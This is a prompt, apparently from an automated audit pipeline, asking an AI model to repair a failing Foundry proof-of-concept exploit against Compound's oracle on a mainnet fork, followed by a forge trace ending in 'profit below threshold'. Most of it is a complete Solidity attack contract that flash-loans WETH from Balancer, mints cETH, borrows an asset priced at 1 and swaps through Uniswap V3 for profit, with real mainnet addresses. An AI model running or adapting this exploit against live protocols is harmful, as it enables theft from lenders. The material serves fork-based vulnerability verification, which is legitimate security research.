You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Reporter-priced assets are live at a hardcoded price of 1 until their first reporter update
- claim: The constructor initializes every REPORTER market with `prices[symbolHash].price = 1`, and both `price()` and `getUnderlyingPrice()` immediately expose that value with no guard proving the first real reporter update has happened. Because FIXED_ETH assets also derive from `prices[ETH_HASH]`, an uninitialized ETH reporter feed can misprice those markets too.
- impact: If governance wires this oracle into Compound before every reporter-backed market has validated once, affected assets can be valued near zero instead of at market price. That can make borrows appear almost free, collapse collateral value, trigger bad debt, and create liquidation or theft opportunities during rollout or migration.
- exploit_paths: ["Deploy the oracle and list it before all reporter feeds call `validate()` once.", "Borrow a reporter-backed asset whose debt is still priced at `1`, so the account is charged almost no borrow value.", "Or use an uninitialized reporter-backed asset as collateral and watch it be valued near zero, making accounts immediately undercollateralized or unusable."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface ICTokenLike {
    function comptroller() external view returns (address);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface ICEtherLike {
    function comptroller() external view returns (address);
    function mint() external payable;
    function balanceOf(address account) external view returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface IComptrollerLike {
    function oracle() external view returns (address);
    function markets(address cToken)
        external
        view
        returns (bool isListed, uint256 collateralFactorMantissa, bool isComped);
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account)
        external
        view
        returns (uint256 error, uint256 liquidity, uint256 shortfall);
    function borrowGuardianPaused(address cToken) external view returns (bool);
    function mintGuardianPaused(address cToken) external view returns (bool);
}

interface IUniswapAnchoredViewLike {
    function numTokens() external view returns (uint256);
    function getTokenConfig(uint256 i)
        external
        view
        returns (
            address cToken,
            address underlying,
            bytes32 symbolHash,
            uint256 baseUnit,
            uint8 priceSource,
            uint256 fixedPrice,
            address uniswapMarket,
            address reporter,
            uint256 reporterMultiplier,
            bool isUniswapReversed
        );
    function prices(bytes32 symbolHash) external view returns (uint248 price, bool failoverActive);
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

interface IBalancerFlashLoanRecipientLike {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        IBalancerFlashLoanRecipientLike recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IUniswapV3PoolLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract FlawVerifier is IBalancerFlashLoanRecipientLike {
    address internal constant TARGET_ORACLE = 0x50ce56A3239671Ab62f185704Caedf626352741e;
    address internal constant COMPTROLLER = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant CETH = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;

    uint8 internal constant PRICE_SOURCE_FIXED_ETH = 0;
    uint8 internal constant PRICE_SOURCE_REPORTER = 2;

    uint256 internal constant EXP_SCALE = 1e18;
    uint256 internal constant MIN_PROFIT = 1e15;
    uint256 internal constant TARGET_COLLATERAL_WETH = 0.1 ether;
    uint256 internal constant CETH_DUST = 1_000;

    uint160 internal constant MIN_SQRT_RATIO_PLUS_ONE = 4295128740;
    uint160 internal constant MAX_SQRT_RATIO_MINUS_ONE =
        1461446703485210103287273052203988822378723970341;

    bytes32 internal constant ETH_HASH = keccak256("ETH");

    struct Opportunity {
        address cToken;
        address underlying;
        address pool;
        bytes32 symbolHash;
        uint256 cash;
    }

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    bool public path0_oracleListedBeforeValidate;
    bool public path1_borrowReporterBackedDebtPricedAtOne;
    bool public path2_fixedEthAssetsDependOnEthReporter;

    string public exploitPathUsed;
    string public infeasibilityReason;

    address internal chosenDebtCToken;
    address internal chosenDebtUnderlying;
    address internal chosenDebtPool;

    uint256 internal startingWethEquivalent;
    uint256 internal flashRepayAmount;
    bool internal flashActive;

    constructor() {
        _profitToken = WETH;
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _resetState();

        if (IComptrollerLike(COMPTROLLER).oracle() != TARGET_ORACLE) {
            infeasibilityReason = "Compound is not currently pointed at the vulnerable oracle.";
            return;
        }

        startingWethEquivalent = _wethEquivalentBalance();

        (uint248 ethStoredPrice,) = IUniswapAnchoredViewLike(TARGET_ORACLE).prices(ETH_HASH);
        Opportunity memory opportunity = _findReporterDebtOpportunity();

        path1_borrowReporterBackedDebtPricedAtOne = opportunity.cToken != address(0);
        path2_fixedEthAssetsDependOnEthReporter = ethStoredPrice == 1 && _hasListedFixedEthMarket();
        path0_oracleListedBeforeValidate =
            path1_borrowReporterBackedDebtPricedAtOne || path2_fixedEthAssetsDependOnEthReporter;

        hypothesisValidated = path0_oracleListedBeforeValidate;
        hypothesisRefuted = !hypothesisValidated;

        if (!path0_oracleListedBeforeValidate) {
            infeasibilityReason =
                "No listed market on this fork still exposes the constructor-time reporter price of 1.";
            return;
        }

        if (!path1_borrowReporterBackedDebtPricedAtOne) {
            infeasibilityReason =
                "The ETH reporter path may still matter for FIXED_ETH assets, but no borrowable reporter-backed debt market remains stuck at 1 on this fork.";
            return;
        }

        if (!_isHealthyCollateralMarket(CETH)) {
            infeasibilityReason = "cETH cannot be used as live collateral on this fork.";
            return;
        }

        chosenDebtCToken = opportunity.cToken;
        chosenDebtUnderlying = opportunity.underlying;
        chosenDebtPool = opportunity.pool;

        exploitPathUsed =
            "oracle listed before reporter validate() -> use verifier-held WETH/ETH first, otherwise flash-loan public WETH liquidity -> mint cETH collateral -> enter Compound -> borrow the reporter-backed market whose stored oracle price is still the constructor default of 1 -> swap only the portion needed through that market's configured public anchor pool to repay temporary funding and lock in WETH profit while the debt remains massively undercharged";

        uint256 directSeed = _min(_wethEquivalentBalance(), TARGET_COLLATERAL_WETH);
        if (directSeed != 0) {
            _executeExploit(directSeed, 0);
            return;
        }

        flashActive = true;

        IERC20Like[] memory tokens = new IERC20Like[](1);
        tokens[0] = IERC20Like(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = TARGET_COLLATERAL_WETH;

        // The flash loan is only a realistic public funding bridge. The exploit profit still
        // comes from borrowing a reporter-priced market while Compound charges debt against
        // the oracle's constructor-time price of 1.
        IBalancerVaultLike(BALANCER_VAULT).flashLoan(this, tokens, amounts, "");
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "bad-vault");
        require(flashActive, "flash-inactive");
        require(tokens.length == 1 && address(tokens[0]) == WETH, "bad-token");
        require(amounts.length == 1 && amounts[0] == TARGET_COLLATERAL_WETH, "bad-amount");

        flashRepayAmount = amounts[0] + feeAmounts[0];
        _executeExploit(amounts[0], flashRepayAmount);

        require(IERC20Like(WETH).balanceOf(address(this)) >= flashRepayAmount, "insufficient-repay");
        _safeTransfer(WETH, BALANCER_VAULT, flashRepayAmount);

        _wrapAllEth();
        _finalizeProfit();

        flashActive = false;
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        (address expectedPool, address tokenIn) = abi.decode(data, (address, address));
        require(msg.sender == expectedPool, "bad-pool");

        uint256 amountToPay;
        if (amount0Delta > 0) {
            amountToPay = uint256(amount0Delta);
        } else if (amount1Delta > 0) {
            amountToPay = uint256(amount1Delta);
        } else {
            revert("no-delta");
        }

        _safeTransfer(tokenIn, msg.sender, amountToPay);
    }

    function _executeExploit(uint256 collateralWeth, uint256 repayWeth) internal {
        _mintCollateralAndBorrow(collateralWeth);
        _redeemCollateralBackoff();
        _wrapAllEth();

        uint256 targetWethBalance = startingWethEquivalent + repayWeth + MIN_PROFIT;
        uint256 currentWethBalance = IERC20Like(WETH).balanceOf(address(this));

        if (currentWethBalance < targetWethBalance) {
            _swapUnderlyingForExactWeth(targetWethBalance - currentWethBalance);
        }

        _wrapAllEth();

        if (repayWeth == 0) {
            _finalizeProfit();
        }
    }

    function _findReporterDebtOpportunity() internal view returns (Opportunity memory best) {
        IUniswapAnchoredViewLike oracle = IUniswapAnchoredViewLike(TARGET_ORACLE);
        uint256 count = oracle.numTokens();

        for (uint256 i = 0; i < count; ++i) {
            (
                address cToken,
                address underlying,
                bytes32 symbolHash,
                uint256 baseUnit,
                uint8 priceSource,
                uint256 fixedPrice,
                address uniswapMarket,
                address reporter,
                uint256 reporterMultiplier,
                bool isUniswapReversed
            ) = oracle.getTokenConfig(i);

            baseUnit;
            fixedPrice;
            reporter;
            reporterMultiplier;
            isUniswapReversed;

            if (priceSource != PRICE_SOURCE_REPORTER) {
                continue;
            }
            if (!_isBorrowableTargetMarket(cToken)) {
                continue;
            }
            if (underlying == address(0) || uniswapMarket == address(0)) {
                continue;
            }
            if (!_poolMatchesUnderlyingWeth(uniswapMarket, underlying)) {
                continue;
            }

            (uint248 storedPrice,) = oracle.prices(symbolHash);
            if (storedPrice != 1) {
                continue;
            }

            uint256 cash = _readCash(cToken);
            if (cash == 0) {
                continue;
            }

            if (cash > best.cash) {
                best = Opportunity({
                    cToken: cToken,
                    underlying: underlying,
                    pool: uniswapMarket,
                    symbolHash: symbolHash,
                    cash: cash
                });
            }
        }
    }

    function _mintCollateralAndBorrow(uint256 collateralWeth) internal {
        require(collateralWeth != 0, "zero-seed");
        require(!_mintIsPaused(CETH), "ceth-mint-paused");

        uint256 cEthBefore = ICEtherLike(CETH).balanceOf(address(this));
        _prepareEth(collateralWeth);
        ICEtherLike(CETH).mint{value: collateralWeth}();

        uint256 cEthMinted = ICEtherLike(CETH).balanceOf(address(this)) - cEthBefore;
        require(cEthMinted != 0, "mint-failed");

        address[] memory markets = new address[](1);
        markets[0] = CETH;
        uint256[] memory enterResults = IComptrollerLike(COMPTROLLER).enterMarkets(markets);
        require(enterResults.length == 1 && enterResults[0] == 0, "enter-failed");

        (, uint256 liquidity, uint256 shortfall) = IComptrollerLike(COMPTROLLER).getAccountLiquidity(address(this));
        require(shortfall == 0 && liquidity != 0, "no-liquidity");

        uint256 debtPrice = _readUnderlyingPrice(chosenDebtCToken);
        require(debtPrice != 0, "debt-price-zero");

        uint256 borrowTarget = _borrowAmountFromLiquidity(liquidity, debtPrice);
        uint256 cash = _readCash(chosenDebtCToken);
        require(cash != 0, "cash-zero");

        borrowTarget = _min(borrowTarget, (cash * 99) / 100);
        require(borrowTarget != 0, "borrow-zero");

        uint256 borrowed = _borrowWithBackoff(borrowTarget, chosenDebtUnderlying);
        require(borrowed != 0, "borrow-failed");
    }

    function _borrowWithBackoff(uint256 attempt, address underlying) internal returns (uint256 borrowed) {
        for (uint256 i = 0; i < 10; ++i) {
            if (attempt == 0) {
                break;
            }

            uint256 beforeBal = IERC20Like(underlying).balanceOf(address(this));
            uint256 err = ICTokenLike(chosenDebtCToken).borrow(attempt);
            uint256 afterBal = IERC20Like(underlying).balanceOf(address(this));

            if (err == 0 && afterBal > beforeBal) {
                borrowed = afterBal - beforeBal;
                break;
            }

            attempt = (attempt * 3) / 4;
        }
    }

    function _redeemCollateralBackoff() internal returns (uint256 wethRecovered) {
        uint256 cTokenBalance = ICEtherLike(CETH).balanceOf(address(this));
        if (cTokenBalance <= CETH_DUST) {
            return 0;
        }

        uint256 target = cTokenBalance - CETH_DUST;
        for (uint256 i = 0; i < 10; ++i) {
            if (target == 0) {
                break;
            }

            uint256 ethBefore = address(this).balance;
            uint256 err = ICEtherLike(CETH).redeem(target);
            uint256 ethAfter = address(this).balance;

            if (err == 0 && ethAfter > ethBefore) {
                wethRecovered = ethAfter - ethBefore;
                break;
            }

            target = (target * 3) / 4;
        }
    }

    function _swapUnderlyingForExactWeth(uint256 wethOut) internal returns (uint256 paidIn) {
        require(wethOut != 0, "swap-zero");
        require(wethOut <= uint256(type(int256).max), "swap-too-large");

        address token0 = IUniswapV3PoolLike(chosenDebtPool).token0();
        address token1 = IUniswapV3PoolLike(chosenDebtPool).token1();
        require(
            (token0 == chosenDebtUnderlying && token1 == WETH) || (token0 == WETH && token1 == chosenDebtUnderlying),
            "unexpected-pool"
        );

        uint256 beforeUnderlying = IERC20Like(chosenDebtUnderlying).balanceOf(address(this));
        bool zeroForOne = token0 == chosenDebtUnderlying;
        uint160 sqrtLimit = zeroForOne ? MIN_SQRT_RATIO_PLUS_ONE : MAX_SQRT_RATIO_MINUS_ONE;

        // Exact-output keeps the public swap limited to the amount needed to repay any temporary
        // funding and surface WETH profit. The exploit value itself remains the underpriced debt.
        IUniswapV3PoolLike(chosenDebtPool).swap(
            address(this),
            zeroForOne,
            -int256(wethOut),
            sqrtLimit,
            abi.encode(chosenDebtPool, chosenDebtUnderlying)
        );

        paidIn = beforeUnderlying - IERC20Like(chosenDebtUnderlying).balanceOf(address(this));
        require(paidIn != 0, "swap-failed");
    }

    function _hasListedFixedEthMarket() internal view returns (bool) {
        IUniswapAnchoredViewLike oracle = IUniswapAnchoredViewLike(TARGET_ORACLE);
        uint256 count = oracle.numTokens();

        for (uint256 i = 0; i < count; ++i) {
            (
                address cToken,
                address underlying,
                bytes32 symbolHash,
                uint256 baseUnit,
                uint8 priceSource,
                uint256 fixedPrice,
                address uniswapMarket,
                address reporter,
                uint256 reporterMultiplier,
                bool isUniswapReversed
            ) = oracle.getTokenConfig(i);

            underlying;
            symbolHash;
            baseUnit;
            fixedPrice;
            uniswapMarket;
            reporter;
            reporterMultiplier;
            isUniswapReversed;

            if (priceSource == PRICE_SOURCE_FIXED_ETH && _isListedOnTargetComptroller(cToken)) {
                return true;
            }
        }

        return false;
    }

    function _resetState() internal {
        _profitToken = WETH;
        _profitAmount = 0;
        profitAchieved = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;

        path0_oracleListedBeforeValidate = false;
        path1_borrowReporterBackedDebtPricedAtOne = false;
        path2_fixedEthAssetsDependOnEthReporter = false;

        exploitPathUsed = "";
        infeasibilityReason = "";

        chosenDebtCToken = address(0);
        chosenDebtUnderlying = address(0);
        chosenDebtPool = address(0);

        flashActive = false;
        flashRepayAmount = 0;
    }

    function _finalizeProfit() internal {
        uint256 finalWeth = _wethEquivalentBalance();
        if (finalWeth > startingWethEquivalent) {
            _profitAmount = finalWeth - startingWethEquivalent;
            profitAchieved = _profitAmount > MIN_PROFIT;
        }
    }

    function _prepareEth(uint256 amount) internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance < amount) {
            IWETHLike(WETH).withdraw(amount - ethBalance);
        }
    }

    function _wrapAllEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            IWETHLike(WETH).deposit{value: ethBalance}();
        }
    }

    function _isHealthyCollateralMarket(address cToken) internal view returns (bool) {
        if (!_isListedOnTargetComptroller(cToken)) {
            return false;
        }
        if (_mintIsPaused(cToken)) {
            return false;
        }

        (bool isListed, uint256 collateralFactorMantissa,) = IComptrollerLike(COMPTROLLER).markets(cToken);
        return isListed && collateralFactorMantissa != 0;
    }

    function _isBorrowableTargetMarket(address cToken) internal view returns (bool) {
        return _isListedOnTargetComptroller(cToken) && !_borrowIsPaused(cToken);
    }

    function _isListedOnTargetComptroller(address cToken) internal view returns (bool) {
        if (cToken == address(0)) {
            return false;
        }

        try ICTokenLike(cToken).comptroller() returns (address marketComptroller) {
            if (marketComptroller != COMPTROLLER) {
                return false;
            }
        } catch {
            return false;
        }

        try IComptrollerLike(COMPTROLLER).markets(cToken) returns (bool isListed, uint256, bool) {
            return isListed;
        } catch {
            return false;
        }
    }

    function _poolMatchesUnderlyingWeth(address pool, address underlying) internal view returns (bool) {
        try IUniswapV3PoolLike(pool).token0() returns (address token0) {
            try IUniswapV3PoolLike(pool).token1() returns (address token1) {
                return (token0 == underlying && token1 == WETH) || (token0 == WETH && token1 == underlying);
            } catch {
                return false;
            }
        } catch {
            return false;
        }
    }

    function _readCash(address cToken) internal view returns (uint256 cash) {
        try ICTokenLike(cToken).getCash() returns (uint256 foundCash) {
            cash = foundCash;
        } catch {}
    }

    function _readUnderlyingPrice(address cToken) internal view returns (uint256 price) {
        try IUniswapAnchoredViewLike(TARGET_ORACLE).getUnderlyingPrice(cToken) returns (uint256 foundPrice) {
            price = foundPrice;
        } catch {}
    }

    function _borrowIsPaused(address cToken) internal view returns (bool paused) {
        try IComptrollerLike(COMPTROLLER).borrowGuardianPaused(cToken) returns (bool foundPaused) {
            paused = foundPaused;
        } catch {}
    }

    function _mintIsPaused(address cToken) internal view returns (bool paused) {
        try IComptrollerLike(COMPTROLLER).mintGuardianPaused(cToken) returns (bool foundPaused) {
            paused = foundPaused;
        } catch {}
    }

    function _borrowAmountFromLiquidity(uint256 liquidity, uint256 debtPrice) internal pure returns (uint256) {
        if (liquidity == 0 || debtPrice == 0) {
            return 0;
        }
        return (liquidity * EXP_SCALE) / debtPrice;
    }

    function _wethEquivalentBalance() internal view returns (uint256) {
        return IERC20Like(WETH).balanceOf(address(this)) + address(this).balance;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```
0x80a2AE356fc9ef4305676f7a3E2Ed04e12C33946) [staticcall]
    │   │   ├─ [6810] 0xBafE01ff935C7305907c33BF824352eE5979B526::markets(0x80a2AE356fc9ef4305676f7a3E2Ed04e12C33946) [delegatecall]
    │   │   │   └─ ← [Return] true, 400000000000000000 [4e17], false
    │   │   └─ ← [Return] true, 400000000000000000 [4e17], false
    │   ├─ [3240] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::borrowGuardianPaused(0x80a2AE356fc9ef4305676f7a3E2Ed04e12C33946) [staticcall]
    │   │   ├─ [2569] 0xBafE01ff935C7305907c33BF824352eE5979B526::borrowGuardianPaused(0x80a2AE356fc9ef4305676f7a3E2Ed04e12C33946) [delegatecall]
    │   │   │   └─ ← [Return] false
    │   │   └─ ← [Return] false
    │   ├─ [266] 0x04916039B1f59D9745Bf6E0a21f191D1e0A84287::token0() [staticcall]
    │   │   └─ ← [Return] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e
    │   ├─ [308] 0x04916039B1f59D9745Bf6E0a21f191D1e0A84287::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2575] 0x50ce56A3239671Ab62f185704Caedf626352741e::prices(0xec34391362c28ee226b3b8624a699ee507a40fa771fd01d38b03ac7b70998bbe) [staticcall]
    │   │   └─ ← [Return] 7429616300 [7.429e9], false
    │   ├─ [1987] 0x50ce56A3239671Ab62f185704Caedf626352741e::getTokenConfig(17) [staticcall]
    │   │   └─ ← [Return] 0xC11b1268C1A384e55C48c2391d8d480264A3A7F4, 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, 0xe98e2830be1a7e4156d656a7505e65d08c67660dc618072422e9c78053c261e9, 100000000 [1e8], 2, 0, 0xCBCdF9626bC03E24f779434178A73a0B4bad62eD, 0x4846efc15CC725456597044e6267ad0b3B51353E, 1000000 [1e6], false
    │   ├─ [2471] 0xC11b1268C1A384e55C48c2391d8d480264A3A7F4::comptroller() [staticcall]
    │   │   └─ ← [Return] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B
    │   ├─ [7505] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::markets(0xC11b1268C1A384e55C48c2391d8d480264A3A7F4) [staticcall]
    │   │   ├─ [6810] 0xBafE01ff935C7305907c33BF824352eE5979B526::markets(0xC11b1268C1A384e55C48c2391d8d480264A3A7F4) [delegatecall]
    │   │   │   └─ ← [Return] true, 600000000000000000 [6e17], true
    │   │   └─ ← [Return] true, 600000000000000000 [6e17], true
    │   ├─ [3240] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::borrowGuardianPaused(0xC11b1268C1A384e55C48c2391d8d480264A3A7F4) [staticcall]
    │   │   ├─ [2569] 0xBafE01ff935C7305907c33BF824352eE5979B526::borrowGuardianPaused(0xC11b1268C1A384e55C48c2391d8d480264A3A7F4) [delegatecall]
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [2013] 0x50ce56A3239671Ab62f185704Caedf626352741e::getTokenConfig(18) [staticcall]
    │   │   └─ ← [Return] 0x041171993284df560249B57358F931D9eB7b925D, 0x8E870D67F660D95d5be530380D0eC0bd388289E1, 0xe6ce7ecb96a43fc15fb4020f93c37885612803dd74366bb6815e4f607ac3ca20, 1000000000000000000 [1e18], 1, 1000000 [1e6], 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 1, false
    │   ├─ [2039] 0x50ce56A3239671Ab62f185704Caedf626352741e::getTokenConfig(19) [staticcall]
    │   │   └─ ← [Return] 0x7713DD9Ca933848F6819F38B8352D9A15EA73F67, 0x956F47F50A910163D8BF957Cf5846D573E7f87CA, 0x58c46f3a00a69ae5a5ce163895c14f8f5b7791333af9fe6e7a73618cb5460913, 1000000000000000000 [1e18], 2, 0, 0x2028D7Ef0223C45caDBF05E13F1823c1228012BF, 0xDe2Fa230d4C05ec0337D7b4fc10e16f5663044B0, 10000000000000000 [1e16], false
    │   ├─ [2449] 0x7713DD9Ca933848F6819F38B8352D9A15EA73F67::comptroller() [staticcall]
    │   │   └─ ← [Return] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B
    │   ├─ [7505] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::markets(0x7713DD9Ca933848F6819F38B8352D9A15EA73F67) [staticcall]
    │   │   ├─ [6810] 0xBafE01ff935C7305907c33BF824352eE5979B526::markets(0x7713DD9Ca933848F6819F38B8352D9A15EA73F67) [delegatecall]
    │   │   │   └─ ← [Return] true, 0, false
    │   │   └─ ← [Return] true, 0, false
    │   ├─ [3240] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::borrowGuardianPaused(0x7713DD9Ca933848F6819F38B8352D9A15EA73F67) [staticcall]
    │   │   ├─ [2569] 0xBafE01ff935C7305907c33BF824352eE5979B526::borrowGuardianPaused(0x7713DD9Ca933848F6819F38B8352D9A15EA73F67) [delegatecall]
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   └─ ← [Stop]
    ├─ [350] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [371] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 19290920 [1.929e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 11.52s (11.49s CPU time)

Ran 1 test suite in 11.53s (11.52s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 591737)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
